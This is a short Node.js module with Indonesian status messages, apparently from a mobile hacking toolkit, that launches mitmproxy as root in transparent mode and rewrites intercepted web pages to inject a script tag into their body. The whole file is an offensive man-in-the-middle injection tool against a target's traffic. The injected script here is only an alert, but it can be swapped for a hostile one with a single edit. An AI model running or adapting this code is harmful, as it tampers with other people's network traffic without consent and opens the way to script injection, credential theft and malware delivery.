const chalk = require("chalk");
const { exec } = require("child_process");

module.exports = {
  run: (targetIP) => {
    console.log(chalk.yellow("📥 Menginject payload ke traffic target..."));

    const cmd = `tsu -c 'mitmproxy --mode transparent --set block_global=false --modify-body "s/<body>/<body><script>alert(1337)<\\/script>/"'`;

    exec(cmd, (err) => {
      if (err) {
        console.error(chalk.red("❌ Gagal inject payload:", err.message));
      } else {
        console.log(chalk.green("✅ Payload berhasil disuntik!"));
      }
    });
  }
};
